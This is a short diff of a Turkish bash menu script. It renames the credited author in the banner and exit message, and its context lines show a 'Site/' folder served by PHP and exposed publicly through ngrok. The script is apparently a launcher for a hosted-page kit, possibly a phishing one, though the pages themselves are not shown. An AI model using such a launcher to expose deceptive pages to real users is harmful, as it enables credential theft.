@@ -19,7 +19,7 @@ echo -e '\033[32;40;1m
 \e[31m[99]\e[37m Exit
 
  '
-echo -e "\033[32;40;1m                      ~~~xBowtie~~~"
+echo -e "\033[32;40;1m                      ~~~azatbgrhn~~~"
 echo ""
 read -p "İslem Numarası : " islem
 if [[ $islem == 1 || $islem == 01 ]]; then
@@ -35,7 +35,7 @@ cd Site/
 php -S 127.0.0.1:$port > -t & ngrok http $port
 elif [[ $islem == 9 || $islem == 99 ]]; then
 clear
-echo -e "\e[31mxBowtie:)) ßß"
+echo -e "\e[31mazatbgrhn:)) ßß"
 sleep 1 
 exit 1
 elif [[ $islem == 00 ]]; then
